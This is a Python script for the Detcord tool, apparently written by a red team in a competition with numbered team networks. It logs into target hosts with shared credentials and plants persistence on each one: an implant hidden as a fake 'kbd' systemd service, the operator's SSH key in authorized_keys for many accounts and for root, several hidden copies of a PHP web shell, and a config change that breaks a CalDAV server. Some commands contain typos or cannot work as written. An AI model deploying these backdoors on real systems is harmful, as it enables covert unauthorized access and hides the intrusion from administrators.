'''
Detcord 
'''

from detcord import action, display


env = {}

# change creds


#env['user'] = 'root'
#env['pass'] = 'changeme'
env['user'] = 'Doctor' 
env['pass'] = 'Changeme2021!'
env['threading'] = False 

HOSTS = [  
         #'10.x.1.10',  #ubuntu lan     rouge windows   ssh/icmp
         #'10.x.1.40',  #ubuntu lan     Ubuntu Desktop  ssh
         #'10.x.2.2',   #ubuntu cloud   web server      web
         #'10.x.2.3',   #ubuntu cloud   database        mysql web
         #'10.x.2.10',  #Ubuntu cloud   IoT Control     web
         '10.x.2.12',  #ubuntu cloud   CalDAV          web
         #'10.x.2.14'   #ubuntu cloud   Notes           web
    ]

TEAMS = [1,2,3,4,5,6,7,8,9,10,11,12,13]
#TEAMS = [15]
EXCLUDE= [1,3,11,12,13]

#env['hosts'] = [host.replace("x", str(team)) for host in HOSTS for team in TEAMS if team not in EXCLUDE]
env['hosts'] = [
#        '192.168.253.2',  #Team 1 pfSense
#        '192.168.253.10', #Team 2 pfSense
#        '192.168.253.18', #Team 3 pfSense
#        '192.168.253.26', #Team 4 pfSense
#        '192.168.253.34', #Team 5 pfSense
#        '192.168.253.42', #Team 6 pfSense
#        '192.168.253.50', #Team 7 pfSense
#        '192.168.253.58', #Team 8 pfSense 
#        '192.168.253.66', #Team 9 pfSense
#        '192.168.253.74', #Team 10 pfSense
#        '192.168.253.82', #Team 11 pfSense
        '192.168.253.90', #Team 12 pfSense
#        '192.168.253.98', #Team 13 pfSense
#        '192.168.253.112' #Team 15 pfSense
]

@action
def deploy_cc(host):
    '''
    Deploy CrowdControl as a linux systemd service
    '''
    ret = host.put("/home/student/deploy/repos/tools/ScrambledEggs/files/crowdcontrol.py", "/home/crowdcontrol.py", sudo=True)
    ret = host.put("/home/student/deploy/repos/tools/ScrambledEggs/files/crowdcontrol.service", "/home/crowdcontrol.service", sudo=True)
    ret = host.run("mkdir /media/.root", sudo=True)
    ret = host.run("touch /home/.root/crowdcontrol.py", sudo=True)
    ret = host.run("mv /home/crowdcontrol.py /media/.root/crowdcontrol.py", sudo=True)
    ret = host.run("touch /etc/systemd/system/kbd.servce", sudo = True)
    ret = host.run("mv /home/crowdcontrol.service /etc/systemd/system/kbd.service", sudo=True)
    ret = host.run("chmod +x /media/.root/crowdcontrol.py", sudo=True)
    ret = host.run("systemctl daemon-reload", sudo=True)
    ret = host.run("systemctl start kbd", sudo=True)
    ret = host.run("systemctl enable kbd", sudo=True)
    ret = host.run("systemctl status kbd", sudo=True)


@action
def deploy_clean_ssh(host):
    '''
    best ssh key dropper in the land
    '''
    users = [   "Admin", 
                "Charts",
                "Doctor",
                "Family",
                "Flu",
                "Health",
                "Masks",
                "Medicine",
                "Nimba",
                "sysadmin",
                "Surgery",
                "Wannacry"
            ]
    for user in users:
        mkdir_cmd = "mkdir /home/{}/.ssh".format(user)
        #print(mkdir_cmd)
        ret = host.run(mkdir_cmd, sudo=True)
        key_dir = "/home/{}/.ssh/authorized_keys".format(user)
        #print(key_dir)
        ret = host.put("/home/student/.ssh/id_rsa.pub", key_dir, sudo=True)
        display(ret)
    
    #special for root
    ret = host.run("sed 's/PermitRootLogin prohibit-password/PermitRootLogin yes/'",sudo=True)
    ret = host.run("sed 's/PermitRootLogin forced-commands-only/PermitRootLogin yes/'", sudo=True)
    ret = host.run("sed 's/PermitRootLogin no/PermitRootLogin yes/'", sudo=True)
    ret = host.run("systemctl restart sshd", sudo=True)
    ret = host.put("/home/student/.ssh/id_rsa.pub", "/root/.ssh/authorized_keys", sudo=True)
    ret = host.run("chown root:root /root/.ssh/authorized_keys", sudo=True)
    ret = host.run("chmod 664 /root/.ssh/authorized_keys", sudo=True)


@action
def deploy_web_shell(host):
    '''
    Deploy a php web shell. Overly deploy.
    '''

    # create directories for shell hiding
    #ret = host.run("mkdir /mnt/floopy", sudo=True) # symbolic link redirect directory 
    ret = host.run("mkdir /var/www/html/content/", sudo = True) # just other locations for web shell hiding
    ret = host.run("mkdir /var/www/html/content/published/", sudo = True) # just other locations for web shell hiding
    ret = host.run("mkdir /var/www/html/content/raw", sudo=True) # 
    ret = host.run("mkdir /var/www/html/php", sudo=True) # a spicy location for some php
    
    # putting the file on the box
    ret = host.put("/home/student/deploy/repos/tools/VelvetHighway/site/shell.php", "/var/www/html/content/.shell.php", sudo=True)
    ret = host.put("/home/student/deploy/repos/tools/VelvetHighway/site/shell.php", "/var/www/html/content/published/.shell.php", sudo=True)
    ret = host.put("/home/student/deploy/repos/tools/VelvetHighway/site/shell.php", "/var/www/html/content/raw/.shell.php", sudo=True)
    ret = host.put("/home/student/deploy/repos/tools/VelvetHighway/site/shell.php", "/var/www/html/php/index.php", sudo=True)
    ret = host.put("/home/student/deploy/repos/tools/VelvetHighway/site/shell.php", "/var/www/html/php/shell.php", sudo=True)
    #ret = host.put("/home/student/deploy/repos/tools/VelvetHighway/site/shell.php", "/mnt/floopy/floopy", sudo=True)
    #ret = host.run("ln -s /mnt/floopy/floopy /var/www/html/.redirect",sudo=True)

    # Chown the things so it looks natural
    #ret = host.run("chown -R root:root /mnt/floopy", sudo=True)
    ret = host.run("chwon -R root:root /var/www/html", sudo=True)

@action
def send_headshot(host):
    '''
    send  headshot
    '''
    ret = host.run("mkdir /root/headshot")
    ret = host.put("/home/student/deploy/repos/tools/headshot", "/root")

@action
def break_baikal(host):
    ret = host.run("sed 's/changeme/REDTEAM/' /var/www/html/baikal/config/baikal.yaml", sudo=True)



@action
def deploy_router_keys(host):
    users = ["admin"]
    for user in users:
        mkdir_cmd = "mkdir /home/{}/.ssh".format(user)
        #print(mkdir_cmd)
        ret = host.run(mkdir_cmd)
        key_dir = "/home/{}/.ssh/authorized_keys".format(user)
        #print(key_dir)
        ret = host.put("/home/student/.ssh/id_rsa.pub", key_dir)
        display(ret)

    #special for root
    #ret = host.run("sed 's/PermitRootLogin prohibit-password/PermitRootLogin yes/'",sudo=True)
    #ret = host.run("sed 's/PermitRootLogin forced-commands-only/PermitRootLogin yes/'", sudo=True)
    #ret = host.run("sed 's/PermitRootLogin no/PermitRootLogin yes/'", sudo=True)
    #ret = host.run("systemctl restart sshd", sudo=True)
    ret = host.put("/home/student/.ssh/id_rsa.pub", "/root/.ssh/authorized_keys", sudo=True)
    ret = host.run("chown root:root /root/.ssh/authorized_keys", sudo=True)
    ret = host.run("chmod 664 /root/.ssh/authorized_keys", sudo=True)

